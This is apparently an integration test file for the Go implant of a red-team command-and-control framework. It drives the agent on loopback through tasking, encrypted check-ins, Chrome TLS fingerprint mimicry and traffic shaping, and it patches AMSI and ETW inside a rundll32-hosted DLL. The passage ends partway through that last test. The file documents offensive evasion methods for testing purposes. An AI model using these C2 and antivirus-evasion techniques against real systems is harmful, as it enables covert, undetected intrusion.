// native-agent.test.mjs — INTEGRATION test for the native (Go) implant tier.
// Guarded: runs ONLY with VARVEL_NATIVE_IT=1 (it drives the compiled binary and spawns
// real child processes). Registered in package.json — skips cleanly without the guard.
//
//   VARVEL_NATIVE_IT=1 node --test test/native-agent.test.mjs
//
// Covers, against the REAL listener (engine/callback.mjs CallbackChannel on loopback):
//   1. enroll → check-in → task down → exec → result up (echo / note / shell kinds)
//   2. kill enforcement: a killed agent's queued task is NEVER delivered (204-uniform)
//   3. ENVELOPE ENCRYPTION leg (engine/envelope.mjs): enc.mode 'required' + the Go
//      agent's -enc flag → check-in with ec:1, sealed task down (wire body proven
//      'enc1:…' and opened channel-side), sealed result up, plaintext pull AND push
//      refused (204-uniform on the wire, 'enc-required' in the ledger)
//   4. JA4 proof through the platform oracle (engine/fingerprint.mjs): go-native vs
//      chrome profiles differ; chrome matches the documented Chrome-on-Windows JA4
//      shape; cross-implementation parity with the Go observer leg (agents/native/ja4)
//   5. Negotiated-protocol evidence (harness/tls-observe.mjs): the chrome profile
//      speaks h2 when the server picks it, channel headers intact over TLS.
//
// If the binary is missing and the portable toolchain (../tools/go) is present, the
// test builds it first with the CONTAINED cache env (never %LOCALAPPDATA%).

import { test, before } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { spawn, spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { CallbackChannel } from '../engine/callback.mjs';
import { deriveEncKey, openString, isSealedString } from '../engine/envelope.mjs';
import { EVASION_RECIPES, parseEvasionEvidence } from '../engine/evasion.mjs';
import { Settings } from '../engine/settings.mjs';
import { expectedJa4h, windowIndexAt, windowFlushAt, SHAPE_PROFILES } from '../engine/malleable.mjs';
import { ja4h } from '../engine/fingerprint.mjs';
import { gradeShape } from '../engine/shapegrade.mjs';
import { captureAgentHello } from '../agents/native/harness/capture-hello.mjs';
import { observeAgentTls } from '../agents/native/harness/tls-observe.mjs';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..');
const ENCLAVE = join(REPO, '..');
const BINARY = join(REPO, 'agents', 'native', 'varvel-agent.exe');
const GO = join(ENCLAVE, 'tools', 'go', 'bin', 'go.exe');
const CC = 'C:\\msys64\\mingw64\\bin\\gcc.exe'; // the DLL build's cgo compiler (execproxy.test.mjs parity)
const SCOPE = { cidrs: ['127.0.0.0/8'] };
const GUARD = process.env.VARVEL_NATIVE_IT === '1';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const hmacHex = (key, msg) => crypto.createHmac('sha256', key).update(msg).digest('hex');
const sha256Hex = (buf) => crypto.createHash('sha256').update(buf).digest('hex');
// HOUSE RULE: payload-class artifacts under repo .tmp (Defender-excluded), never os.tmpdir().
const TMP_ROOT = join(REPO, '.tmp');
mkdirSync(TMP_ROOT, { recursive: true });

// Cross-implementation parity anchors: the pure-Go observer (agents/native/ja4) and
// the platform oracle (engine/fingerprint.mjs) measured these SAME strings over the
// two profiles' real wire bytes on 2026-08-18, uTLS v1.8.2, go1.26.6. A dependency
// bump that changes the ClientHello SHOULD turn this pin red — update it deliberately.
const PIN = {
  chrome: 't13d1516h2_8daaf6152771_d8a2da3f94cd',
  goNative: 't13d1312h2_f57a46bbacb6_ab7e3b40a677',
};

async function waitFor(fn, { timeout = 12000, every = 100, what = 'condition' } = {}) {
  const deadline = Date.now() + timeout;
  for (;;) {
    const v = await fn();
    if (v) return v;
    if (Date.now() > deadline) throw new Error('timeout waiting for ' + what);
    await sleep(every);
  }
}

before(() => {
  if (!GUARD) return;
  if (existsSync(BINARY)) return;
  if (!existsSync(GO)) {
    throw new Error('native agent binary missing (' + BINARY + ') and no portable Go toolchain at ' + GO + ' — see docs/NATIVE.md build instructions');
  }
  const gocache = join(ENCLAVE, 'tools', 'gocache');
  const r = spawnSync(GO, ['build', '-ldflags=-s -w', '-o', 'varvel-agent.exe', '.'], {
    cwd: join(REPO, 'agents', 'native'),
    env: {
      ...process.env,
      GOCACHE: join(gocache, 'cache'), GOPATH: join(gocache, 'path'),
      GOMODCACHE: join(gocache, 'modcache'), GOTMPDIR: join(gocache, 'tmp'), GOTOOLCHAIN: 'local',
    },
    encoding: 'utf8', timeout: 300000,
  });
  if (r.status !== 0) throw new Error('go build failed: ' + r.stderr);
});

test('native agent: full governed round trip on the REAL channel (enroll, task, result, kill)', { skip: !GUARD }, async () => {
  const events = [];
  const ch = new CallbackChannel({ scope: SCOPE, onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { port } = await ch.arm(0);
  const dir = mkdtempSync(join(tmpdir(), 'varvel-native-it-'));
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({ label: 'native-it' });
    child = spawn(BINARY, [
      '-url', `http://127.0.0.1:${port}`, '-id', agentId, '-token', token,
      '-interval', '250', '-jitter', '100', '-dir', dir,
    ], { windowsHide: true });
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d; });

    // 1. ENROLL + CHECK-IN: the agent appears on the fleet view over the http wire.
    await waitFor(() => {
      const v = ch.agentsView().find((a) => a.agentId === agentId);
      return v && v.checkins >= 1 ? v : null;
    }, { what: 'first native check-in' });

    // 2. TASK DOWN + RESULT UP: echo (pure wire probe), note, and a real shell child.
    const echoId = ch.task(agentId, 'echo', 'native-echo-probe');
    const echoResult = await waitFor(() => ch.results(agentId, { taskId: echoId })[0], { what: 'echo result' });
    assert.equal(echoResult.data, 'native-echo-probe');

    const noteId = ch.task(agentId, 'note', 'ledger note');
    const noteResult = await waitFor(() => ch.results(agentId, { taskId: noteId })[0], { what: 'note result' });
    assert.equal(noteResult.data, 'noted: ledger note');

    const shellId = ch.task(agentId, 'shell', 'Write-Output native-shell-ok');
    const shellResult = await waitFor(() => ch.results(agentId, { taskId: shellId })[0], { what: 'shell result', timeout: 30000 });
    assert.match(shellResult.data, /native-shell-ok/, 'powershell child ran cwd-confined and its output rode /r home');

    // 3. AUDIT: the governed lifecycle is in the ledger for the NATIVE agent exactly
    //    as for the sim agent (registered/checkin/delivered/received).
    for (const t of ['agent.registered', 'agent.checkin', 'task.queued', 'task.delivered', 'result.received']) {
      assert.ok(events.some((e) => e.type === t), 'audited: ' + t);
    }

    // 4. KILL ENFORCEMENT: after kill(), a queued task must NEVER be delivered; the
    //    agent's check-ins die into the 204-uniform silence (checkins counter freezes).
    ch.kill(agentId);
    const frozenAt = ch.agentsView().find((a) => a.agentId === agentId).checkins;
    const deadTaskId = ch.task(agentId, 'echo', 'must never arrive'); // returns null: task() refuses killed agents
    assert.equal(deadTaskId, null, 'channel refuses to task a killed agent');
    await sleep(1500); // several poll cycles at 250±100ms
    const after = ch.agentsView().find((a) => a.agentId === agentId);
    assert.equal(after.checkins, frozenAt, 'killed agent check-ins are 204-uniform rejects — none counted');
    assert.ok(events.some((e) => e.type === 'agent.killed'), 'kill audited');
    assert.equal(stderr.includes('task must never arrive'), false, 'no post-kill task reached the agent');
  } finally {
    try { if (child) child.kill(); } catch {}
    await ch.disarm();
  }
});

test('native agent: strict seq is agent-global across pulls AND pushes (replay dies)', { skip: !GUARD }, async () => {
  const ch = new CallbackChannel({ scope: SCOPE });
  const { port } = await ch.arm(0);
  const dir = mkdtempSync(join(tmpdir(), 'varvel-native-it-'));
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({});
    child = spawn(BINARY, ['-url', `http://127.0.0.1:${port}`, '-id', agentId, '-token', token, '-interval', '250', '-jitter', '100', '-dir', dir], { windowsHide: true });
    child.stderr.on('data', () => {});
    // One task → the push consumes seq N+1 right after pull N. If the agent kept
    // per-route counters, the push would be a stale-seq reject and the result would
    // never land. Its arrival IS the assertion.
    const taskId = ch.task(agentId, 'echo', 'seq-parity');
    const r = await waitFor(() => ch.results(agentId, { taskId })[0], { what: 'seq-parity result' });
    assert.equal(r.data, 'seq-parity');
  } finally {
    try { if (child) child.kill(); } catch {}
    await ch.disarm();
  }
});

test('native agent: envelope enc leg — required mode, sealed down/up, plaintext refused', { skip: !GUARD }, async () => {
  const events = [];
  const ch = new CallbackChannel({ scope: SCOPE, enc: 'required', onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { port } = await ch.arm(0);
  const dir = mkdtempSync(join(TMP_ROOT, 'native-it-enc-'));
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({ label: 'native-it-enc' });
    child = spawn(BINARY, [
      '-url', `http://127.0.0.1:${port}`, '-id', agentId, '-token', token,
      '-interval', '250', '-jitter', '100', '-dir', dir, '-enc',
    ], { windowsHide: true });
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d; });

    // 1. CHECK-IN with the ec:1 capability header: accepted in required mode, the
    //    capability ratchet flips the fleet-view record and is audited.
    const view = await waitFor(() => {
      const v = ch.agentsView().find((a) => a.agentId === agentId);
      return v && v.checkins >= 1 ? v : null;
    }, { what: 'first enc check-in' });
    assert.equal(view.enc, true, 'enc capability ratcheted on the fleet view');
    assert.ok(events.some((e) => e.type === 'enc.negotiated' && e.via === 'capability' && e.transport === 'http'), 'enc.negotiated audited');

    // 2. SEALED TASK DOWN + SEALED RESULT UP: the Go agent opened the sealed reply
    //    (a plaintext one would be refused as a downgrade) and the channel opened the
    //    sealed push — the result landing in plaintext IS the two-way proof.
    const echoId = ch.task(agentId, 'echo', 'native-enc-round-trip');
    const echoResult = await waitFor(() => ch.results(agentId, { taskId: echoId })[0], { what: 'enc echo result' });
    assert.equal(echoResult.data, 'native-enc-round-trip');
    assert.equal(stderr.includes('PLAINTEXT task reply refused'), false, 'no downgrade refusal on the sealed leg');

    try { child.kill(); } catch {}
    child = null;

    // 3. WIRE-SHAPE PROOF + PLAINTEXT REFUSALS, raw probes at a high seq (the agent
    //    is dead; seq only needs to stay strictly increasing):
    const key = deriveEncKey(token, agentId);
    let seq = 1000000;
    const rawPull = (withEnc) => fetch(`http://127.0.0.1:${port}/c`, {
      headers: { 'x-agent': agentId, 'x-seq': String(seq), 'x-auth': hmacHex(token, agentId + ':' + seq + ':pull'), ...(withEnc ? { 'x-varvel-enc': '1' } : {}) },
    });

    // (a) plaintext PULL (no capability header) in required mode => 204-uniform on the
    //     wire, 'enc-required' in the ledger.
    let r = await rawPull(false);
    assert.equal(r.status, 204, 'capability-less pull refused 204-uniform');
    await r.arrayBuffer();
    assert.ok(events.some((e) => e.type === 'checkin.rejected' && e.reason === 'enc-required'), "ledger: 'enc-required' refusal");

    // (b) sealed DOWN shape: a queued task arrives as 'enc1:…' and opens with the
    //     derived key to the task JSON.
    seq++;
    const taskId = ch.task(agentId, 'note', 'sealed-shape-probe');
    r = await rawPull(true);
    assert.equal(r.status, 200);
    const bodyText = await r.text();
    assert.ok(isSealedString(bodyText), 'task reply body is the sealed string form');
    const opened = JSON.parse(openString(key, bodyText));
    assert.deepEqual(opened, { taskId, kind: 'note', data: 'sealed-shape-probe' });

    // (c) plaintext PUSH (valid HMAC over cleartext) in required mode => refused the
    //     same way: 204-uniform + 'enc-required'.
    seq++;
    const plainBody = Buffer.from('plaintext result attempt');
    r = await fetch(`http://127.0.0.1:${port}/r`, {
      method: 'POST', body: plainBody,
      headers: { 'x-agent': agentId, 'x-seq': String(seq), 'x-task': taskId, 'x-auth': hmacHex(token, agentId + ':' + seq + ':' + taskId + ':' + sha256Hex(plainBody)) },
    });
    assert.equal(r.status, 204, 'plaintext push refused 204-uniform');
    await r.arrayBuffer();
    assert.equal(events.filter((e) => e.type === 'checkin.rejected' && e.reason === 'enc-required').length, 2, 'both plaintext attempts ledgered as enc-required');
    assert.equal(ch.results(agentId, { taskId }).length, 0, 'the refused plaintext result never landed');
  } finally {
    try { if (child) child.kill(); } catch {}
    await ch.disarm();
  }
});

test('JA4: go-native != chrome, chrome wears the documented Chrome shape (platform oracle)', { skip: !GUARD }, async () => {
  const goNative = await captureAgentHello(BINARY, 'go-native');
  assert.equal(goNative.ok, true, goNative.error || goNative.stderr);
  const chrome = await captureAgentHello(BINARY, 'chrome');
  assert.equal(chrome.ok, true, chrome.error || chrome.stderr);

  // (a) the flag demonstrably changes the wire.
  assert.notEqual(chrome.ja4, goNative.ja4);

  // (b) chrome profile vs the DOCUMENTED Chrome-on-Windows JA4 (FoxIO README examples:
  //     t13d1516h2_8daaf6152771_02713d6af862; issue #31 Chrome 120+ECH
  //     t13d1517h2_8daaf6152771_b1ff8ab2d16f): _a_ shape + the stable Chrome
  //     cipher-list hash 8daaf6152771. The _c_ section is version drift — reported.
  assert.match(chrome.ja4, /^t13d15\d{2}h2_8daaf6152771_[0-9a-f]{12}$/, 'chrome JA4 must match the documented Chrome shape');
  assert.equal(chrome.ja4.split('_')[0], 't13d1516h2');
  assert.ok(!goNative.ja4.includes('_8daaf6152771_'), 'go-native must not wear the Chrome cipher hash');

  // Cross-implementation parity: the platform oracle (Node) and the pure-Go observer
  // (agents/native/ja4) computed IDENTICAL strings over each profile's wire bytes.
  assert.equal(chrome.ja4, PIN.chrome, 'Node oracle must equal the Go-observer measurement (uTLS v1.8.2 pin)');
  assert.equal(goNative.ja4, PIN.goNative, 'Node oracle must equal the Go-observer measurement (go1.26.6 pin)');

  // (c) ALPN offered: h2 first in both profiles, as offered on the wire.
  assert.deepEqual(chrome.parsed.alpn, ['h2', 'http/1.1']);
  assert.deepEqual(goNative.parsed.alpn, ['h2', 'http/1.1']);
  console.log('  MEASURED (platform oracle) chrome JA4:   ' + chrome.ja4);
  console.log('  MEASURED (platform oracle) go-native JA4: ' + goNative.ja4);
});

test('TLS observe: chrome profile negotiates h2, channel headers intact over TLS', { skip: !GUARD }, async () => {
  for (const profile of ['chrome', 'go-native']) {
    const r = await observeAgentTls(BINARY, profile);
    assert.equal(r.ok, true, r.error || r.stderr);
    assert.equal(r.seen.length >= 1, true);
    const s = r.seen[0];
    // Against an h2-capable server BOTH profiles negotiate h2 and speak HTTP/2.0 —
    // the chrome leg does it through the uTLS hello + the purpose h2 round tripper.
    assert.equal(s.alpn, 'h2', profile + ' negotiated ALPN');
    assert.equal(s.httpVersion, '2.0', profile + ' request version');
    assert.equal(s.tlsVersion, 'TLSv1.3');
    assert.equal(s.channelHeaders['x-agent'], 'ja4probe');
    assert.equal(s.channelHeaders['x-auth'], true, 'x-auth HMAC header rides the TLS wire intact');
    console.log(`  MEASURED negotiated (${profile}): alpn=${s.alpn} http=${s.httpVersion} tls=${s.tlsVersion} cipher=${s.cipher}`);
  }
});

test('native agent: shape pack — channel-delivered cdn-asset adopted, wire measures as claimed (shapegrade)', { skip: !GUARD }, async () => {
  const events = [];
  const ch = new CallbackChannel({ scope: SCOPE, onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { port } = await ch.arm(0);
  const dir = mkdtempSync(join(tmpdir(), 'varvel-native-shape-'));
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({ label: 'native-it-shape' });
    child = spawn(BINARY, [
      '-url', `http://127.0.0.1:${port}`, '-id', agentId, '-token', token,
      '-interval', '250', '-jitter', '100', '-dir', dir,
    ], { windowsHide: true });
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d; });

    // 1. the agent starts PLAIN (today's minimal wire — the pre-shape baseline).
    await waitFor(() => {
      const v = ch.agentsView().find((a) => a.agentId === agentId);
      return v && v.checkins >= 1 ? v : null;
    }, { what: 'first plain check-in' });

    // 2. the operator applies the shape channel-side; delivery rides the next reply.
    const applied = ch.setShapeProfile(agentId, 'cdn-asset');
    assert.equal(applied.name, 'cdn-asset');
    await waitFor(() => (stderr.includes('shape adopted: cdn-asset') ? true : null), { what: 'native shape adoption note' });

    // 3. check-ins land on the SHAPED pull routes with the profile's cadence
    //    (4000±40%ms — waits accommodate the adopted, slower loop).
    const pullRoutes = SHAPE_PROFILES['cdn-asset'].http.pullPaths;
    await waitFor(() => {
      const obs = ch.fpStatus().observations.filter((o) => o.agent === agentId && pullRoutes.includes(o.route));
      return obs.length >= 2 ? obs : null;
    }, { what: 'shaped pull observations', timeout: 20000 });

    // 4. a full task round trip on the shaped wire: the push rides the profile's
    //    push route (/api/telemetry).
    const taskId = ch.task(agentId, 'echo', 'native-shaped-round-trip');
    const r = await waitFor(() => ch.results(agentId, { taskId })[0], { what: 'shaped echo result', timeout: 20000 });
    assert.equal(r.data, 'native-shaped-round-trip');

    // 5. THE MEASUREMENT: the platform oracle's JA4H over the agent's real wire ==
    //    the profile's claim, pull AND push (exact strings).
    const ring = ch.fpStatus().observations.filter((o) => o.agent === agentId);
    const claimPull = expectedJa4h('cdn-asset', { method: 'GET', ja4hFn: ja4h });
    const claimPush = expectedJa4h('cdn-asset', { method: 'POST', ja4hFn: ja4h });
    assert.ok(ring.some((o) => pullRoutes.includes(o.route) && o.ja4h === claimPull), 'measured pull JA4H == the claim on a shaped pull route');
    assert.ok(ring.some((o) => o.route === '/api/telemetry' && o.ja4h === claimPush), 'measured push JA4H == the claim on the push route');

    // 6. shapegrade's claimed-vs-measured verdict over the channel's own ring
    //    (pull-route observations only — the POST fingerprint is a different string
    //    by design and the grader's dominant-JA4H check is the pull's).
    const grade = gradeShape({ shape: 'cdn-asset', observations: ring.filter((o) => pullRoutes.includes(o.route)), flow: null });
    const ja4hCheck = grade.checks.find((c) => c.dim === 'ja4h-pull');
    assert.equal(ja4hCheck.verdict, 'match', JSON.stringify(ja4hCheck));
    assert.equal(grade.verdict, 'measures-as-claimed');
    assert.equal(grade.divergent.length, 0);
    console.log('  MEASURED native shapegrade (cdn-asset): verdict ' + grade.verdict + ' · pull JA4H ' + claimPull + ' · push JA4H ' + claimPush);
  } finally {
    try { if (child) child.kill(); } catch {}
    await ch.disarm();
  }
});

test('native agent: batch dwell windows + constant-rate padding over the wire', { skip: !GUARD }, async () => {
  const events = [];
  const ch = new CallbackChannel({ scope: SCOPE, onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { port } = await ch.arm(0);
  const dir = mkdtempSync(join(tmpdir(), 'varvel-native-batch-'));
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({ label: 'native-it-batch' });
    child = spawn(BINARY, [
      '-url', `http://127.0.0.1:${port}`, '-id', agentId, '-token', token,
      '-interval', '250', '-jitter', '100', '-dir', dir,
    ], { windowsHide: true });
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d; });
    await waitFor(() => {
      const v = ch.agentsView().find((a) => a.agentId === agentId);
      return v && v.checkins >= 1 ? v : null;
    }, { what: 'first check-in' });

    // — BATCH/DWELL: a custom shape with a 2s window. The channel HOLDS queued tasks
    //   until the seeded flush point (HMAC(token, 'varvel-batch:'+windowIndex)); the
    //   agent dwells to the same point derived independently from the shared token.
    ch.setShapeProfile(agentId, {
      name: 'lab-batch', cadence: { intervalMs: 400, jitterPct: 0.1 }, batch: { windowMs: 2000 },
      http: { pullPaths: ['/lb/pull'], pushPaths: ['/lb/push'], queryKey: 'q', headers: [['user-agent', '{ua}'], ['accept', '*/*']], uaPool: ['lab-native/1.0'] },
    });
    await waitFor(() => (stderr.includes('shape adopted: lab-batch') ? true : null), { what: 'batch shape adoption' });
    const shapeAt = ch.agents.get(agentId).shapeAt;
    const queuedAt = Date.now();
    const w = windowIndexAt(shapeAt, 2000, queuedAt);
    const flushAt = windowFlushAt(token, shapeAt, 2000, w);
    const ids = [ch.task(agentId, 'note', 'held-a'), ch.task(agentId, 'note', 'held-b')];
    const results = await waitFor(() => {
      const got = ids.flatMap((id) => ch.results(agentId, { taskId: id }));
      return got.length === 2 ? got : null;
    }, { what: 'batch flush results', timeout: 20000 });
    // delivered as ONE batched burst, never before the window's seeded flush point.
    assert.equal(events.filter((e) => e.type === 'task.delivered' && e.batched === true).length, 2, 'both held tasks delivered batched');
    for (const r of results) {
      assert.ok(r.receivedAt + 150 >= flushAt, 'held tasks must not flush before the seeded point (flush ' + flushAt + ', received ' + r.receivedAt + ')');
    }
    console.log('  MEASURED batch dwell: window ' + w + ' flushAt +' + (flushAt - shapeAt - w * 2000) + 'ms into the window · 2 held tasks flushed as one burst');

    // — PADDING: a custom shape with perCycle 3 (2 dummies per cycle). The channel
    //   audits every pad as itself ('agent.pad') — shaping never hides traffic from
    //   the ledger. The pads consume agent-global seq (a stale pad would be refused).
    ch.setShapeProfile(agentId, {
      name: 'lab-pad', cadence: { intervalMs: 600, jitterPct: 0.2 }, padding: { perCycle: 3 },
      http: { pullPaths: ['/lp/pull'], pushPaths: ['/lp/push'], queryKey: 'p', headers: [['user-agent', '{ua}'], ['accept', '*/*']], uaPool: ['lab-pad/1.0'] },
    });
    await waitFor(() => (stderr.includes('shape adopted: lab-pad') ? true : null), { what: 'padding shape adoption' });
    const pads = await waitFor(() => {
      const n = events.filter((e) => e.type === 'agent.pad' && e.agentId === agentId).length;
      return n >= 3 ? n : null;
    }, { what: 'padding dummies audited', timeout: 20000 });
    console.log('  MEASURED padding: ' + pads + ' pad envelopes audited as agent.pad (perCycle 3, cadence 600±20%ms)');
  } finally {
    try { if (child) child.kill(); } catch {}
    await ch.disarm();
  }
});

test('native agent: launch-time -shape flag (telemetry-beacon) shapes the very first request', { skip: !GUARD }, async () => {
  const ch = new CallbackChannel({ scope: SCOPE });
  const { port } = await ch.arm(0);
  const dir = mkdtempSync(join(tmpdir(), 'varvel-native-shapeflag-'));
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({ label: 'native-it-shapeflag' });
    // NO setShapeProfile: the launch flag alone must shape the wire. The channel
    // answers the shaped paths only once it knows the shape — so apply the same
    // profile channel-side WITHOUT relying on the header to teach the agent.
    ch.setShapeProfile(agentId, 'telemetry-beacon');
    child = spawn(BINARY, [
      '-url', `http://127.0.0.1:${port}`, '-id', agentId, '-token', token,
      '-interval', '250', '-jitter', '100', '-dir', dir, '-shape', 'telemetry-beacon',
    ], { windowsHide: true });
    child.stderr.on('data', () => {});
    const pullRoutes = SHAPE_PROFILES['telemetry-beacon'].http.pullPaths;
    const claimPull = expectedJa4h('telemetry-beacon', { method: 'GET', ja4hFn: ja4h });
    const obs = await waitFor(() => {
      const got = ch.fpStatus().observations.filter((o) => o.agent === agentId && pullRoutes.includes(o.route) && o.ja4h === claimPull);
      return got.length >= 1 ? got : null;
    }, { what: 'launch-shaped first check-in', timeout: 20000 });
    assert.ok(obs[0].route !== '/c', 'the first check-in is already on a shaped path');
    console.log('  MEASURED launch-shape (telemetry-beacon): first request on ' + obs[0].route + ' · JA4H ' + claimPull + ' == claim');
  } finally {
    try { if (child) child.kill(); } catch {}
    await ch.disarm();
  }
});

// — EVASION TIER (native port) ————————————————————————————————————————————————
// The native agent carries the evasion tier IN ITS OWN COMPILED CODE (agents/native/
// evasion_windows.go): no script-parse surface, so no script scanner ever sees the
// recipe (the chicken-and-egg finding of 2026-08-24: the PS tier's script-carried
// recipes are AMSI-signatured at parse; a DLL's are not). These legs prove it LIVE:
// the DLL form is built for real, a Microsoft-SIGNED host (rundll32.exe) loads it,
// and the governed channel drives status -> enable(amsi,etw) -> status -> restore ->
// status INSIDE THE HOST PROCESS — asserting the evidence chain (hashes, measured
// flips, restore-verified) AND its parity with the channel-side parser (the
// cross-implementation vector: the Go-produced evidence JSON feeds the REAL
// engine/evasion.mjs parseEvasionEvidence unchanged).
// NOTE (by design, stated plainly like the PS tier's live leg): scanning the
// official AMSI test string and patching AmsiScanBuffer in-process may raise a real
// Defender alert on this host — that alert IS the measurement. Contained: own-
// process, in-memory, restored over the wire, and gone with the child either way.

test('native agent: EVASION tier in a signed host (rundll32+DLL) — enable/verify/restore chain + evidence-parser parity', { skip: !GUARD, timeout: 420000 }, async (t) => {
  if (process.platform !== 'win32') return t.skip('windows-only (amsi.dll/ntdll.dll in-process recipes)');
  if (!existsSync(GO)) return t.skip('no portable Go toolchain at ' + GO);
  if (!existsSync(CC)) return t.skip('buildmode=c-shared needs the mingw gcc at ' + CC);
  // Settings discipline (evasion.test.mjs parity): this process's settings go to a
  // throwaway file; the engagement name is unique.
  process.env.VARVEL_SETTINGS_FILE = join(TMP_ROOT, 'native-it-evasion-settings-' + Date.now() + '.json');
  const eng = 'native-it-evasion-' + Date.now();
  Settings.for(eng).set('exec.evasion', true); // channel half of the double gate: OPEN

  const work = mkdtempSync(join(TMP_ROOT, 'native-it-evasion-'));
  const dll = join(work, 'varvel-agent.dll');
  const gocache = join(ENCLAVE, 'tools', 'gocache');
  // 1. BUILD the DLL form for real, contained caches only (never %LOCALAPPDATA%).
  const build = spawnSync(GO, ['build', '-tags', 'varveldll', '-buildmode=c-shared', '-ldflags=-s -w', '-o', dll, '.'], {
    cwd: join(REPO, 'agents', 'native'),
    env: {
      ...process.env,
      GOCACHE: join(gocache, 'cache'), GOPATH: join(gocache, 'path'),
      GOMODCACHE: join(gocache, 'modcache'), GOTMPDIR: join(gocache, 'tmp'), GOTOOLCHAIN: 'local',
      CGO_ENABLED: '1', CC,
    },
    encoding: 'utf8', timeout: 360000,
  });
  if (build.status !== 0) throw new Error('go build (c-shared) failed: ' + build.stderr);
  console.log('  MEASURED evasion DLL build: ' + dll + ' (' + (await import('node:fs')).statSync(dll).size + ' bytes)');

  const events = [];
  const ch = new CallbackChannel({ scope: { engagement: eng, signedBy: 'test', cidrs: ['127.0.0.0/8'] }, onEvent: (ty, o) => events.push({ type: ty, ...o }) });
  const { port } = await ch.arm(0);
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({ label: 'native-it-evasion' });
    // 2. The SIGNED HOST runs the agent: rundll32 loads the DLL; the config arms the
    //    agent-side half of the gate ("allowEvasion": true — the DLL's -allow-evasion).
    const cfg = join(work, 'run.json');
    writeFileSync(cfg, JSON.stringify({
      url: `http://127.0.0.1:${port}`, id: agentId, token,
      interval: 250, jitter: 100, dir: join(work, 'sandbox'), allowEvasion: true,
    }));
    child = spawn('rundll32.exe', [dll + ',VarvelRunR', '@' + cfg], { windowsHide: true });
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d; });
    await waitFor(() => {
      const v = ch.agentsView().find((a) => a.agentId === agentId);
      return v && v.checkins >= 1 ? v : null;
    }, { what: 'first check-in from the rundll32-hosted agent', timeout: 30000 });
    assert.match(stderr, /evasion ARMED \(-allow-evasion/, 'the launch line reports the gate ARMED honestly');

    const taskResult = async (kind, data, what) => {
      const taskId = ch.task(agentId, kind, data);
      assert.ok(taskId, kind + ' queued (the engagement gate is open)');
      const r = await waitFor(() => ch.results(agentId, { taskId })[0], { what, timeout: 30000 });
      return { taskId, body: r.data, parsed: JSON.parse(r.data) };
    };

    // 3. STATUS: a fresh host process is untouched (never-patched techniques resolve
    //    nothing — reported honestly, no memory touched).
    const st0 = await taskResult('evasion-status', '', 'initial evasion-status');
    assert.equal(st0.parsed.state, 'untouched');
    assert.equal(st0.parsed.techniques.amsi.state, 'not-applied');
    assert.equal(st0.parsed.techniques.etw.state, 'not-applied');
    // CROSS-IMPLEMENTATION VECTOR: the Go-produced evidence JSON feeds the REAL
    // channel-side parser, unchanged.
    const ev0 = parseEvasionEvidence(st0.body);
    assert.equal(ev0.event, 'evasion.status');
    assert.equal(ev0.fields.state, 'untouched');
    assert.equal(ev0.fields.pid, child.pid, 'the evidence pid IS the signed host process (rundll32) — the agent runs in-process');

    // 4. ENABLE amsi+etw inside the rundll32 process.
    const en = await taskResult('evasion-enable', '{"techniques":["amsi","etw"]}', 'evasion-enable');
    assert.equal(en.parsed.state, 'patched', JSON.stringify(en.parsed.techniques));
    const amsiEn = en.parsed.techniques.amsi;
    assert.equal(amsiEn.state, 'patched');
    assert.equal(amsiEn.byteVerified, true, 'the write was re-read and proven');
    assert.ok(amsiEn.originalSha256, 'the original bytes were snapshotted first (cleanup doctrine)');
    assert.equal(amsiEn.patchedSha256, EVASION_RECIPES.amsi.recipeSha256, 'the patched region hashes to the pinned public recipe');
    assert.notEqual(amsiEn.originalSha256, amsiEn.patchedSha256);
    if (amsiEn.verify.before !== 'blocked') {
      // honest skip (PS live-test parity): without a blocked baseline the flip is
      // unprovable on this host — restore what was patched, then skip.
      await taskResult('evasion-restore', '', 'evasion-restore (pre-skip cleanup)');
      return t.skip('the official AMSI test string was not blocked pre-patch on this host (before=' + amsiEn.verify.before + ') — the flip is unprovable here');
    }
    assert.equal(amsiEn.verify.after, 'clear', 'post-patch the scan never evaluates the content');
    assert.equal(amsiEn.verify.flipProven, true, 'MEASURED in the signed host: blocked -> clear');
    const etwEn = en.parsed.techniques.etw;
    assert.equal(etwEn.state, 'patched');
    assert.equal(etwEn.byteVerified, true);
    assert.equal(etwEn.patchedSha256, EVASION_RECIPES.etw.recipeSha256);
    assert.match(etwEn.verify.functional, /returned 0x0/, 'the Go port\'s ETW probe: the patched export returns ERROR_SUCCESS immediately when called in-process');
    // channel-side audit + the parity vector on the enable body
    const taskAudit = events.find((e) => e.type === 'evasion.task' && e.kind === 'evasion-enable');
    assert.ok(taskAudit, 'evasion.task audited at queue time');
    assert.equal(taskAudit.recipes.amsi.recipeSha256, EVASION_RECIPES.amsi.recipeSha256);
    const evEn = parseEvasionEvidence(en.body);
    assert.equal(evEn.event, 'evasion.applied');
    assert.equal(evEn.fields.pid, child.pid, 'the patch landed in the rundll32 process, provably');
    assert.equal(evEn.fields.techniques.amsi.flipProven, true);
    assert.equal(evEn.fields.techniques.etw.byteVerified, true);
    assert.ok(events.some((e) => e.type === 'evasion.applied'), 'the intake audited the applied patch from the Go evidence JSON');

    // 5. STATUS mid-patch: the LIVE re-read proves the patch is still in place.
    const st1 = await taskResult('evasion-status', '', 'mid-patch evasion-status');
    assert.equal(st1.parsed.state, 'patched');
    assert.equal(st1.parsed.techniques.amsi.byteVerified, true, 'live re-read: measured now, not remembered');
    assert.equal(st1.parsed.techniques.etw.byteVerified, true);

